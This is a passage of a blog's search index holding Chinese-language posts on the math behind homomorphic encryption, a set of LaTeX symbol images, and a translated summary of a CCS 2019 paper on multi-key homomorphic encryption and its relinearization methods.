<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>基础知识</title>
    <link href="/2022/01/13/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2022/01/13/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="多项式环">多项式环</h1><p>环上的多项式：设R是一个有单位元1的交换环，x是R上的一个未定元，<span class="math inline">\(a_{0},a_{1},a_{2},...,a_{n}∈R\)</span>，称形如<span class="math inline">\(f(x)=a_{0}+a_{1}x+a_{2}x^{2}+...+a_{n}x^{n}\)</span>的表达式为R上x的一个多项式，其中<span class="math inline">\(a_{i}x^{i}\)</span>称为多项式f(x)的i次项，<span class="math inline">\(a_{i}\)</span>称为i次项的系数，如果<span class="math inline">\(a_{n}≠0\)</span>，则称f(x)的次数为n，记作deg f(x)=n。<br><br> 环R上所有关于x的多项式构成的集合记为R[x]。<br><br></p><h1 id="范数">范数</h1><ul><li>1范数<br> 所有元素绝对值的和<br> <span class="math inline">\(||x||_{1}=|x_{1}|+|x_{2}|+...+|x_{n}|\)</span></li><li>2范数<br> 所有元素平方和的开方<br> <span class="math inline">\(||x||_{2}=\sqrt{|x_{1}|^{2}+|x_{2}|^{2}+...+|x_{n}|^{2}}\)</span></li><li>无穷范数<br> 正无穷范数：所有元素中绝对值最大的<br> <span class="math inline">\(||x||_{\infty}=max(|x_{1}|,|x_{2}|,...,|x_{n}|)\)</span><br> 负无穷范数：所有元素中绝对值最小的<br> <span class="math inline">\(||x||_{-\infty}=min(|x_{1}|,|x_{2}|,...,|x_{n}|)\)</span><br></li></ul><h1 id="扩张因子">扩张因子</h1><p>设剩余类环<span class="math inline">\(R=\mathbb{Z}[x]/(f(x)),f(x)∈\mathbb{Z}[x]\)</span>是<span class="math inline">\(\mathbb{Z}\)</span>上的首一多项式，<span class="math inline">\(\forall{u(x),v(x)∈R}\)</span>，称<span class="math inline">\(\gamma=sup\{\frac{||u(x)×v(x)||_{\infty}}{||u(x)||_{\infty}·||v(x)||_{\infty}}:u(x),v(x)∈R\}\)</span>为环R的无穷范数的扩张因子。</p><h1 id="分圆多项式">分圆多项式</h1><p>分圆多项式是指某个n次本原单位根满足的最小次数的首一整系数多项式（必定是不可约多项式）。</p>]]></content>
    
    
    <categories>
      
      <category>FHE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LaTeX常用符号</title>
    <link href="/2022/01/12/LaTeX%E5%B8%B8%E7%94%A8%E7%AC%A6%E5%8F%B7/"/>
    <url>/2022/01/12/LaTeX%E5%B8%B8%E7%94%A8%E7%AC%A6%E5%8F%B7/</url>
    
    <content type="html"><![CDATA[<p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0hurd7nj30hz05gmzd.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0iwqbipj30l50b8dkl.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0j96699j30m70ffagw.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0jj0iubj30l70cbjwf.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0jq9b2wj30ka06stb3.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0jxopg5j30iw0g810m.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0ke2w2uj30jt08z77k.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0kml5r6j30hb068dh2.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0ktjbqoj30pp0bs79c.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0l2hinaj30nb05pdhi.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0la0f9mj30kv04wdh4.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0lg44vdj30mc03b0ts.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0llz84tj30it0gp7es.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0ltudk8j30fd0c9jxk.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0m15qttj30iu0g2129.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0m7mr72j30gp07pwi6.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0mcw5zij30i707ztci.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0mle0q3j30lt07vq7h.jpg" /></p><p>转自：https://blog.csdn.net/Ying_Xu/article/details/51240291</p>]]></content>
    
    
    <categories>
      
      <category>FHE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CCS19</title>
    <link href="/2022/01/12/CCS19/"/>
    <url>/2022/01/12/CCS19/</url>
    
    <content type="html"><![CDATA[<center><big>Efficient Multi-Key Homomorphic Encryption with Packed Ciphertexts with Application to Oblivious Neural Network Inference</big></center><p><br></p><p><strong>摘要</strong><br></p><p>  同态加密（HE）是一个支持对密文数据进行操作的密码系统，lópez-Alt 等人提出了一个广义的HE概念，称为多密钥同态加密（MKHE），能够对不同密钥加密的密文执行算术运算。<br></p><p>  在本论文中，我们提出了两种基于压缩密文的多密钥HE方案变体。给出了新的重新线性化算法，比之前等人的方案更简单、更快。然后我们概况了HE的自举性技术，以得到多密钥全同态加密方案。使用Microsoft SEAL提供了两个MKHE方案的概念验证实现。例如，当基环的维数为8192时，与四方相关联的多密钥BGV密文之间的同态乘法以及随后的重新线性化大约用时116毫秒。<br></p><p>  我们的MKHE方案在多个数据提供者之间的安全计算中有着广泛的应用，作为基准，我们使用预训练的卷积神经网络模型对图像进行同态分类，其中输入数据和模型使用了不同的密钥进行加密。我们需要大约1.8秒来实现对MNIST数据集中一个加密图像的一个卷积层和两个完全连接的层的评估。</p><h1 id="介绍">1. 介绍</h1><p>  推动新的科学发现产生和使用了大量数据，有效并负责任地利用大数据仍然是一个巨大的挑战。这个问题可以通过外包给拥有密集计算资源的公共云服务提供商来缓解。但是，在外包数据分析的隐私和安全性方面仍然存在问题。在过去几年里，用于安全计算的密码技术已经取得了重大进展。在安全计算方面的技术中，多方计算（MPC）和同态加密（HE）由于技术上的突破而受到了越来越多的关注。<br></p><p>  MPC的历史可以追溯到三十年前，从那时起理论界就对其进行了深入研究。在多方计算中，两个或多个参与方参与协议交互，来对输入的私有数据进行计算，只有函数的输出会显示给参与方。近年来，人们在提高MPC的实际效率方面进行了大量的工作，最先进的协议在性能方面取得了数量级的改进。但是就通信复杂度而言，这些协议本质上仍然是低效的：协议期间，参与各方需要交换的比特数与函数的复杂性和参与方数目之间的乘积成正比。因此，高通信复杂度仍然是MPC协议的主要瓶颈。<br></p><p>  此外，上述MPC协议对于基于云的应用程序可能并不可取，因为所有相关方都需要执行与功能复杂性成比例的本地计算。但是在实际中，我们不能期望数据提供者在整个协议执行期间执行大量的工作或一直保持在线。因此提出了另一种模型，其中数据所有者与少量独立服务器私密地共享数据，这些服务器再执行MPC来生成计算结果。这些协议具有良好的性能，它们将负担从数据提供者转移到了服务器，但是它们的隐私保证依赖于服务器不相互串通的假设。<br></p><p>  HE指的是一种密码系统，允许在加密数据上进行计算，而无需解密数据，从而能够在不受信任的云中安全地外包计算。在Gentry首次构造后（基于理想格的全同态加密方案），HE的技术有了重大进步。例如，可以将多个明文值加密为单个压缩密文，并使用单指令多数据技术（SIMD）对这些值并行执行操作。因此，具有压缩技术的HE方案的每个明文值具有良好的摊销复杂度，并且已经被应用在隐私保护的大数据分析中。但是，传统的HE方案只允许计算同一密钥下可进行解密的密文。因此，HE并不支持存在多个数据提供者的安全计算应用程序，每个数据提供者都提供自己的密钥。<br></p><p>  lópez-Alt 等人提出了一种MKHE方案，它是一种密码原语，支持密文上的算术运算，而密文不要求需要使用同一密钥解密。除了解决上述HE的问题外，MKHE还可用于以最小的通信成本设计高效的MPC协议。此外，基于MKHE的MPC协议满足动态MPC属性，其中待评估的电路可以在数据提供者上传其加密数据后动态决定。<br></p><p>  尽管MKHE具有多功能性，但在实践中很少使用。早期的研究使用了GSW方案的多密钥变体。这些结构具有较大的密文，且它们的性能不能很好地随参与方的数量而扩展。以前的工作提出了短密文的MKHE方案，并警告一个密文只加密一个比特位。现在唯一的具有压缩密文的MKHE方案是BGV方案的多密钥变体。请注意，上述所有研究都是纯粹抽象的，没有给出实现，支持SIMD操作的MKHE方案是否可行仍然是一个悬而未决的问题。</p><h2 id="贡献">1.1 贡献</h2><p>  我们设计了BFV和CKKS方案的多密钥变体。提出了一种新的生成重新线性化密钥的方法，该方法比以前的技术更简单、更快。此外，我们将这些方案的最新自举算法应用于多密钥场景，以构建具有压缩密文的多密钥全同态加密。最后，我们给出了使用Microsoft SEAL实现的多密钥方案的概念证明，并给出了实验结果。据我们所知，这是第一个支持压缩密文的MKHE方案的实际实现。<br></p><p>  我们还提出了第一个可行的MKHE应用，能够安全地评估一个预训练卷积神经网络（CNN）模型。我们构造了一个高效的协议，其中云服务器使用模型提供者提供的分类器向数据所有者提供在线预测服务，同时使用MKHE保护数据和模型的隐私。我们的方案支持多密钥操作，因此可以在较低的端到端延迟下实现这一点，并且数据和模型提供者的成本接近最优（如图Fig.1）。服务器可以存储不同密钥加密的大量密文，但特定任务的计算成本仅取决于与电路相关的参与方的数量。我们注意到，我们的解决方案比单密钥HE具有优势， 因为ML模型提供者不需要将未加密的模型发送到服务器。</p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyayrs3t5vj30o108twgv.jpg" /></p><h2 id="构造概述">1.2 构造概述</h2><p>  设分圆环<span class="math inline">\(R=\mathbb{Z}[X]/(x^{n}+1)\)</span>，<span class="math inline">\(s_{i}∈R\)</span>是第i方的秘密，构造基于环的MKHE方案的出发点是要求生成的方案能够在独立生成的密钥下处理密文上的同态计算。与K个不同方相关联的MKHE方案的密文形式为<span class="math inline">\(\overline{ct}=(c_{0},c_{1},...,c_{k})∈R_{q}^{k+1}\)</span>，其中模数q可以由级联的密钥<span class="math inline">\(\overline{sk}=(1,s_{1},...,s_{k})\)</span>解密。换句话说，其相位<span class="math inline">\(μ=&lt;\overline{ck},\overline{sk}&gt;(mod\ q)\)</span>是对应于基本方案的密文消息m的随机编码。<br></p><p>  BFV或CKKS的同态乘法包含两个步骤：张量积与再线性化。两个输入密文的张量积满足<span class="math inline">\(&lt;\overline{ct_{1}}\otimes\overline{ct_{2}},\overline{sk}\otimes\overline{sk}&gt;=&lt;\overline{ct_{1}},\overline{sk}&gt;·&lt;\overline{ct_{2}},\overline{sk}&gt;\)</span>，因此它是在<span class="math inline">\(\overline{sk}\otimes\overline{sk}\)</span>下的有效加密。在重新线性化步骤中，我们的目标是将扩展密文<span class="math inline">\(\overline{ct}=\overline{ct_{1}}\otimes\overline{ct_{2}}∈R_{q}^{(k+1)^{2}}\)</span>转换为在<span class="math inline">\(\overline{sk}\)</span>下加密相同消息的规范密文。此步骤可以理解为一个密钥切换过程，需要对<span class="math inline">\(\overline{sk}\otimes\overline{sk}\)</span>进行特殊加密。我们注意到，<span class="math inline">\(\overline{sk}\otimes\overline{sk}\)</span>包含依赖于两个不同方的项<span class="math inline">\(s_{i}s_{j}\)</span>。因此，与传统HE方案不同的是，与非线性项对应的重新线性化密钥不能由一方生成。<br></p><p>  我们提出了一种基于RLWE的密码系统来实现这一功能。它看起来类似于GSW的环形变体，但我们的方案支持不同密钥下密文之间的一些操作。设<span class="math inline">\(g∈\mathbb{Z}_{d}\)</span>是积分向量，成为Gadget向量。该方案使用公共参考字符串模型CRS，各方共享一个随机多项式向量<span class="math inline">\(a∈R_{q}^{d}\)</span>。每一方自己生成一个特殊的对<span class="math inline">\(s_{i}\)</span>的加密，它是一个满足<span class="math inline">\(d_{i,0}+s_{i}·d_{i,1}≈r_{i}·g\ (mod\ q)\)</span>和<span class="math inline">\(d_{i,2}≈r_{i}·a+s_{i}·g\ (mod\ q)\)</span>的矩阵，其中<span class="math inline">\(r_{i}\)</span>是从密钥分布中采样的一个小多项式。它作为第i方的评估密钥被公布。<br></p><p>  我们提出了两种具有不同优点的再线性化方法。对于每一对<span class="math inline">\(1≤i,j≤k\)</span>，第一种方法将第i个评估密钥<span class="math inline">\(D_{i}\)</span>与第j个公钥<span class="math inline">\(b_{j}≈-s_{j}·a\ (mod\ q)\)</span>组合以生成<span class="math inline">\(K_{i,j}∈R_{q}^{d×3}，K_{i,j}·(1,s_{i},s_{j})≈s_{i}s_{j}·g\ (mod\ q)\)</span>。也就是说，<span class="math inline">\(K_{i,j}\)</span>可以用于将扩展密文的一项<span class="math inline">\(c_{i,j}\)</span>重新线性化为一个三元组<span class="math inline">\((c_{0}&#39;,c_{1}&#39;,c_{2}&#39;)，c_{0}&#39;+c_{i}&#39;s_{i}&#39;+c_{j}&#39;s_{j}&#39;≈c_{i,j}s_{i}s_{j}\ (mod\ q)\)</span>。这种方法可以视为先前GSW密文扩展的变体。特别的，<span class="math inline">\(K_{i,j}\)</span>的每一行由<span class="math inline">\(R_{q}\)</span>中的三个多项式组成，因此一个共享的重线性化密钥{<span class="math inline">\(K_{i,j}\)</span>}<span class="math inline">\(_{1≤i,j≤k}\)</span>的比特大小是<span class="math inline">\(O(dk^{2}·nlog\ q)\)</span>，密钥生成的复杂度是<span class="math inline">\(O(d^{2}k^{2})\)</span>多项式运算模q。重新线性化算法从<span class="math inline">\(s_{i,j}\)</span>到<span class="math inline">\((1,s_{i},s_{j})\)</span>重复<span class="math inline">\(O(k^{2})\)</span>密钥切换操作，因此它的复杂度是<span class="math inline">\(R_{q}\)</span>中的<span class="math inline">\(O(dk)^{2}\)</span>。我们注意到，<span class="math inline">\(K_{i,j}\)</span>可用于与第i方第j方相关的任何计算。<br></p><p>  我们的第二种方法通过递归方式将第j方的公钥<span class="math inline">\(b_{j}\)</span>与第i方的评估密钥<span class="math inline">\(D_{i}\)</span>相乘，直接将扩展密文的每一项线性化。第一个解决方案应该生成并存储一个共享的重新线性化密钥{<span class="math inline">\(K_{i,j}\)</span>}<span class="math inline">\(_{1≤i,j≤k}\)</span>，这使得它的空间和时间复杂度在k上二次增长。但是，第二种算法允许我们只保留在k上线性的个人评估密钥。此外，它还显著降低了重新线性化带来的附加噪声的方差，因此我们可以在保持相同功能的同时使用更小的参数。最后，我们将模数提升技术应用于第二种方法，以进一步降低噪声增长。<br></p><p>  作为一个正交问题，压缩MKHE方案的自举性在文献中还没有研究过。我们将现有的HE方案的自举方法推广到多密钥。推广的主要问题是，自举性的pipeline包含一些高级功能，如slot置换。我们通过将多密钥切换技术应用于Galois自同构，解决了这个问题并提供了所有必要的操作。<br></p><p>  最后，我们将最先进的优化技术应用于我们的MKHE方案，以实现对HE方案性能的改进。例如，我们实现了MKHE方案的剩余数系统（RNS）变体，并使用RNS友好的分解方法进行重新线性化，从而避免了昂贵的高精度算法。</p><h2 id="相关工作">1.3 相关工作</h2><p>  lópez-Alt 等人首先提出了一种基于NTRU的MKHE方案。之后Clear和McGoldrick提出了GSW的多密钥变体以及密文扩展技术来设计MKHE 方案，Mukherjee和Wichs对其进行了简化。Peikert和Shiehian在同一个多密钥GSW方案的基础上开发了两个multi-hop MKHE方案。但是，这些方案只能对大量的GSW扩展密文中的一个比特进行加密。<br></p><p>  Brakerski和Perlman提出了一种具有短密文（基于LWE）的MKHE方案，但其渐进/具体效率还没有得到明确的证明。Chen, Chillotti和Song在MKHE原语的首次实现中应用了TFHE框架，提出了一种改进方案。然而该方案不支持压缩技术，因此导致类似于TFHE的较大的膨胀率。<br></p><p>  最相关的研究是由Chen等人和li等人进行的。他们通过基于多密钥GSW方案生成重新线性化密钥来设计BGV的多密钥变体。但是，它由<span class="math inline">\(O(k^{2})\)</span>个密钥交换（从<span class="math inline">\(s_{i}s_{j}\)</span>切换到含有O(k)个分量的普通密钥）组成。此外，他们没有提供任何实施结果或关于具体性能的分析。我们的工作是这些研究的延伸，因为我们的重新线性化方法和其他优化技术也可以应用于BGV。我们还强调，通过观察评估键的稀疏性，可以提高以前MKHE方案的性能，但文章中并没有指明这一点。在表1中，我们提供了最近MKHE方案的表现；在我们的工作中用到了第二项进行比较。 <img src="http://tva1.sinaimg.cn/large/007aD2tWgy1gyb58pbp6rj30mj0a0jww.jpg" /></p><h1 id="背景">2. 背景</h1><h2 id="符号">2.1 符号</h2><p>  除非另有说明，否则所有对数均以2为底。用粗体表示向量，用大写粗体表示矩阵，用<span class="math inline">\(&lt;u,v&gt;\)</span>表示两个向量u、v的点积。对于实数r，<span class="math inline">\(⌊r⌉\)</span>表示距离r最近的整数，在中间时向上取整。我们用x←D来表示根据分布D的采样x。对于有限集S，U(S)表示S上的均匀分布。在本文中，我们令λ表示安全参数，所有已知的针对作用域下加密方案的有效攻击都应该采取<span class="math inline">\(Ω(2^{λ})\)</span>位操作。</p><h2 id="多密钥同态加密">2.2 多密钥同态加密</h2><p>  多密钥同态加密是一种密码系统，它允许我们评估可能使用不同密钥加密的密文上的算数电路。<br></p><p>  设M为具有算数结构的消息空间。一个MKHE方案由五个算法组成（Setup，KeyGen，Enc，Dec，Eval）。我们假设每个参与方都有一个对其公钥和私钥的引用（索引）。多密钥密文隐式包含一组有序的关联规则<span class="math inline">\(T=\{id_{1},...,id_{k}\}\)</span>，例如，一个新密文<span class="math inline">\(ct ← MKHE.Enc(μ; pk_{id})\)</span>对应一个元素集<span class="math inline">\(T = {id}\)</span>，随着各方密文计算的进行，参考集的大小会越来越大。</p><ul><li>Setup：<span class="math inline">\(pp ← MKHE.Setup(1^{λ}\)</span>).将安全参数λ作为输入，并返回公共参数pp。我们假设所有其他算法都隐式地将pp作为输入。</li><li>KeyGeneration：<span class="math inline">\((sk,pk) ← MKHE.KeyGen(pp)\)</span>. 输出一对公钥和私钥。</li><li>Encryption: <span class="math inline">\(ct ← MKHE.Enc(μ; pk_{id}\)</span>). 对明文μ∈M进行加密，输出密文<span class="math inline">\(ct ∈\{0,1\}*\)</span>。</li><li>Decryption：<span class="math inline">\(μ ← MKHE.Dec(\overline{ct};\{sk_{id}\}_{id∈T}\)</span>). 给定具有相应私钥序列的密文，输出明文。</li><li>Homomorphic evaluation：<span class="math inline">\(\overline{ct} ← MKHE.Eval(C,(\overline{ct_{1}},...,\overline{ct_{\iota}}),\{pk_{id}\}_{id∈T}\)</span>).给定电路C、多密钥密文元组以及相应的公钥集，输出密文。其引用集是输入密文的引用集的并集。</li></ul><p>  语义安全：对于任何两条消息<span class="math inline">\(μ_{0},μ_{1}∈M\)</span>，在i=0,1下，其分布<span class="math inline">\(\{MKHE.Enc(μ;pk_{id})\}\)</span>应该是不可区分的，其中<span class="math inline">\(pp←MKHE.Setup(1^(λ)),(sk,pk)←MKHE.KeyGen(pp)\)</span>。<br></p><p>  正确性与紧凑性：对于固定多项式<span class="math inline">\(poly(λ,k)\)</span>，如果与k方相关的密文大小是由poly(.,.)限定，则MKHE方案是紧凑的。<br></p><p>  对于<span class="math inline">\(1\le{j}\le{\iota}\)</span>，设<span class="math inline">\(\overline{ct}_{j}\)</span>为密文（引用集为<span class="math inline">\(T_{j}\)</span>），<span class="math inline">\(MKHE.Dec(\overline{ct}_{j},\{sk_{id}\}_{id\in{T}}),T=T_{1}\cup...\cup{T_{\iota}}\)</span>。则<span class="math inline">\(MKHE.Dec(\overline{ct}_{j},\{sk_{id}\}_{id\in{T}})=C(μ_{1},...,μ_{\iota})\)</span>  (1)<br></p><p>  (1)的等式可用近似等式替代，近似等式类似于支持近似算法的CKKS方案。</p><h2 id="环上的容错学习问题">2.3 环上的容错学习问题</h2><p>  在本文中，我们假设n是一个二次整数，<span class="math inline">\(R=\mathbb{Z}[x]/(X^{n}+1)\)</span>。记模整数q的R的剩余环为<span class="math inline">\(R_{q}=R/q·R)\)</span>。参数为(n,q,χ,ψ)的环上的容错学习问题：假设给定任意形式为<span class="math inline">\((a_{i},b_{i}=s·a_{i}+e_{i})∈R_{q}^{2}\)</span>的样本，其中<span class="math inline">\(a_{i}\)</span>在<span class="math inline">\(R_{q}\)</span>中是均匀随机的，从<span class="math inline">\(R_{q}\)</span>上的密钥分布χ中选择s，从R上的误差分布ψ中选择<span class="math inline">\(e_{i}\)</span>，<span class="math inline">\(b_{i}\)</span>在计算上与<span class="math inline">\(R_{q}\)</span>上的均匀随机元素是无法区分的。</p><h2 id="gadget分解">2.4 Gadget分解</h2><p>  设<span class="math inline">\(g=(g_{i}∈\mathbb{Z}^{d})\)</span>是一个Gadget向量，q为整数。Gadget分解用<span class="math inline">\(g^{-1}\)</span>表示，是一个从<span class="math inline">\(R_{q}\)</span>到<span class="math inline">\(R^{d}\)</span>的函数，它将元素<span class="math inline">\(a∈R_{q}\)</span>转换为小多项式<span class="math inline">\(u=(u_{0},...,u_{d-1})∈R^{d}\)</span>，满足<span class="math inline">\(a=\sum_{i=1}^{d-1}{g_{i}·u_{i}}(mod\ q)\)</span>。<br></p><p>  Gadget分解技术广泛应用于HE方案的构造中。非线性电路的同态评估基于密钥交换技术，大多数HE方案利用各种Gadget分解方法来控制噪声增长。相关文献中提出了各种分解方法，如位分解、基分解和基于RNS的分解。我们的实现利用了RNS-friendly分解来提高效率。</p><h1 id="重新线性化多密钥密文">3. 重新线性化多密钥密文</h1><p>  本节给出了对我们MKHE方案的高级描述，并解释了如何执行作为同态算数核心运算的重新线性化过程。</p><h2 id="具有压缩密文的he概述">3.1 具有压缩密文的HE概述</h2><p>  近年来，HE方案的表现取得了显著进步。例如，密文压缩技术允许我们在一个密文中加密多个数据，并以SIMD方式执行并行同态操作。目前，就每个明文时隙的摊销大小和时间而言，BGV、BFV和CKKS等批处理HE方案是性能最好的方案。他们采用一些类似DFT的算法将明文值向量转换为分圆环的元素。<br></p><p>  令<span class="math inline">\(sk=(1,s)\)</span>表示私钥<span class="math inline">\(s∈R\)</span>。基于RLWE的规范密文形式为<span class="math inline">\(ct=(c_{0},c_{1})∈R_{q}^{2}\)</span>，内积<span class="math inline">\(μ=&lt;ct,sk&gt;(mod\ q)\)</span>（相位）是明文m的随机编码。例如，BFV密文的相位以<span class="math inline">\(μ=(q/t)·m+e\)</span>的形式来表示模t明文，而CKKS的相位<span class="math inline">\(μ=m+e\)</span>是明文的近似值。<br></p><p>  对于同态计算，我们基本在给定密文的相位之间进行算术运算。特别的，RLWE密文的同态乘法包括两个步骤：张量积和重新线性化。对于输入密文<span class="math inline">\(ct_{1}\)</span>和<span class="math inline">\(ct_{2}\)</span>，我们首先计算它们的张量积并返回满足<span class="math inline">\(&lt;ct,sk\otimes{sk}&gt;=&lt;ct_{1},sk&gt;·&lt;ct_{2},sk&gt;\)</span>的扩展密文<span class="math inline">\(ct=ct_{1}\otimes{ct_{2}}\)</span>。由于<span class="math inline">\(sk\otimes{sk}\)</span>包含非线性项<span class="math inline">\(s^{2}\)</span>，它需要执行重新线性化过程，将扩展密文转换为加密相同消息的规范密文。粗略地说，我们发布了一个重新线性化密钥，它是在sk下对<span class="math inline">\(s^{2}\)</span>进行加密的某种密文，并为此转换执行了密钥交换算法。<br></p><p>  在多密钥情况下，与k个不同方相关的密文形式为<span class="math inline">\(\overline{ct}=(c_{0},c_{1},...,c_{k})∈R_{q}^{k+1}\)</span>，它可以由级联密钥<span class="math inline">\(\overline{sk}=(1,s_{1},...,s_{k})\)</span>解密，其相位由<span class="math inline">\(μ=&lt;\overline{ct},\overline{sk}&gt;=c_{0}+\sum_{i=1}^{k}{c_{i}·s_{i}}\)</span>计算。如果我们遵循与单密钥设计中相同的同态操作流程，则张量积步骤将返回对应于<span class="math inline">\(\overline{sk}\otimes\overline{sk}\)</span>的扩展密文。因此，我们需要生成一个重新线性化密钥，该密钥由对<span class="math inline">\(\overline{sk}\otimes\overline{sk}\)</span>的项<span class="math inline">\(s_{i}s_{j}\)</span>加密的多个密文组成。与经典的HE方案不同，它需要一些额外的计算，因为<span class="math inline">\(s_{i}s_{j}\)</span>依赖于由不同方独立生成的两个密钥。接下来，我们将解释如何有效地为多密钥同态乘法生成重新线性化密钥。</p><h2 id="基本方案">3.2 基本方案</h2><p>  在本节中，我们将介绍一个基于环的方案，该方案用于生成一些重新线性化所需的公共参数。<br></p><ul><li><span class="math inline">\(Setup(1^{(\lambda)})\)</span>：对于给定的安全参数λ，设置RLWE维数n，密文模数q，密钥分布χ和在R上的错误分布ψ。生成一个随机向量<span class="math inline">\(\mathrm{a}←U(R_{q}^{d})\)</span>，返回公共参数<span class="math inline">\(pp=(n,q,χ,ψ,\mathrm{a})\)</span>.</li><li><span class="math inline">\(KeyGen(pp)\)</span>：采样私钥<span class="math inline">\(s←χ\)</span>。采样误差向量<span class="math inline">\(e←ψ^{d}\)</span>，并设置公钥为<span class="math inline">\(b=-s·\mathrm{a}+e(mod\ q) ∈ R_{q}^{d}\)</span></li><li><span class="math inline">\(UniEnc(µ;s)\)</span>：对于输入明文µ∈R，生成密文<span class="math inline">\(D=[d_{0}|d_{1}|d_{2}]∈R_{q}^{d×3}\)</span>如下：<br>   (1)采样<span class="math inline">\(r←χ\)</span><br>   (2)采样<span class="math inline">\(d_{1}←U(R_{q}^{d}),e_{1}←ψ^{d}\)</span>，设置<span class="math inline">\(d_{0}=-s·d_{1}+e_{1}+r·g\ (mod\ q)\)</span><br></li></ul><p>  (3)采样<span class="math inline">\(e_{2}←ψ^{d}\)</span>并设置<span class="math inline">\(d_{2}=r·a+e_{2}+µ·g\ (mod\ q)\)</span></p><p>  单加密（uni-encryption）算法是一种对称加密算法，可以加密单个环元素。一个单加密密文<span class="math inline">\(D=[d_{0}|d_{1}|d_{2}]←UniEnc(µ;s)\)</span>由<span class="math inline">\(R_{q}^{d}\)</span>中的三个向量组成，因此是<span class="math inline">\(R_{q}^{2d×2}\)</span>中普通RGSW密文的3/4倍。对于一个单加密密文D，前两列<span class="math inline">\([d_{0}|d_{1}]\)</span>可视为密钥s下r的加密，而<span class="math inline">\([d_{2}|−\mathrm{a}]\)</span>形成密钥r下µ的加密。<br></p><p>  安全性。单加密方案在参数(n,q, χ,ψ)的RLWE假设下是IND-CPA安全的。对任意u∈R，如下分布在计算上与<span class="math inline">\(R_{q}^{d}×R_{q}^{d}×R_{q}^{d×3}\)</span>上的均匀分布是不可区分的。<br></p><p><span class="math inline">\(\{(\mathrm{a},b,D):pp=(n,q,χ,ψ)←Setup(1^{(\lambda)}),(s,b)←KeyGen(pp),D←UniEnc(µ;s)\}\)</span></p><h2 id="重新线性化">3.3 重新线性化</h2><p>  我们重新讨论了扩展密文的重新线性化过程，并提出了两种具有不同优点的解决方案。在级联密钥<span class="math inline">\(\overline{sk}=(1,s_{1},...,s_{k})\)</span>下加密的两个多密钥密文<span class="math inline">\(\overline{ct}_{i}∈R_{q}^{k+1}\)</span>的张量积<span class="math inline">\(\overline{ct}=\overline{ct}_{1}\otimes\overline{ct}_{2}\)</span>可以被视为对应于张量平方密钥<span class="math inline">\(\overline{sk}\otimes\overline{sk}\)</span>的密文。注意，<span class="math inline">\(\overline{sk}\otimes\overline{sk}\)</span>包含一些与两个不同方相关的非线性项<span class="math inline">\(s_{i}s_{j}\)</span>。因此，计算服务器应该能，计算服务器应该能够通过非线性项<span class="math inline">\(s_{i}s_{j}\)</span>的线性化将扩展密文<span class="math inline">\(\overline{ct}_∈R_{q}^{(k+1)×(k+1)}\)</span>转换为规范密文。<br></p><p>  我们的重新线性化方法需要以下各方生成的相同公共材料（评估密钥）：</p><ul><li><span class="math inline">\(EvkGen(s)\)</span>：给定密钥s∈R，返回D ← UniEnc(s;s).</li></ul><p>  确切地说，每一方i都通过运行算法<span class="math inline">\((s_{i},b_{i})←KeyGen(pp)\)</span>和<span class="math inline">\(D_{i}←EvkGen(s_{i})\)</span>来生成自己的私钥、公钥和评估密钥，然后公布<span class="math inline">\((b_{i}, D_{i})\)</span>。在本节的其余部分中，我们将介绍两种重新线性化算法，并解释它们的优缺点。<br></p><p>  我们做了一个额外的循环安全性假设，因为评估密钥是由自身加密的密钥s的单加密。但是需要强调的是，我们的假设并不比要求密文自举或重新线性化的方案中的相同假设强。</p><h3 id="第一种方法">3.3.1 第一种方法</h3><p>  该解决方案包括一个预处理步骤，该步骤生成对应于所涉及的一组参与方的共享重新线性化密钥。共享重新线性化密钥由所有<span class="math inline">\(s_{i}·s_{j},1\leqslant{i,j}\leqslant{k}\)</span>加密组成。然后我们可以通过应用标准密钥交换技术来重新线性化扩展密文。<br></p><p>  此方法类似于先前工作中提出的方法，该方法还生成共享的评估密钥。但是，我们的共享重新线性化密钥的每个元素都是根据最多两方的公共信息计算的，因此由三个向量组成，而先前基于多密钥GSW方案的方法具有O(k)维数的项。</p><ul><li><p><span class="math inline">\(Convert(D_{i},b_{j})\)</span>：将（可能不同的）参与方i和j生成的一对单加密密文<span class="math inline">\(D_{i}=[d_{i,0}|d_{i,1}|d_{i,2}]∈R_{q}^{d×3}\)</span>和公钥<span class="math inline">\(b_{j}∈R_{q}^{d}\)</span>作为输入。设<span class="math inline">\(k_{i,j,0}\)</span>和<span class="math inline">\(k_{i,j,1}\)</span>是<span class="math inline">\(R_{q}^{d}\)</span>中的向量，使得<span class="math 